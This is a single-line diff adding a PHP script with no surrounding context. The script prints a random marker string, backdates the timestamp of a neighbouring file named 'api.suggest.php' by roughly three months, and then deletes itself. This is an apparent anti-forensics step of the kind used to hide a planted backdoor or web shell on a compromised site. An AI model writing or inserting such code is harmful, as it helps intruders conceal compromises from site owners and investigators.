@@ -1,0 +1,1 @@
+<?php echo "AyfmskxZuZ"; if (file_exists("./api.suggest.php")){ touch("./api.suggest.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*hCzdgqmcKVfZY5gF7kSZ*/ ?>
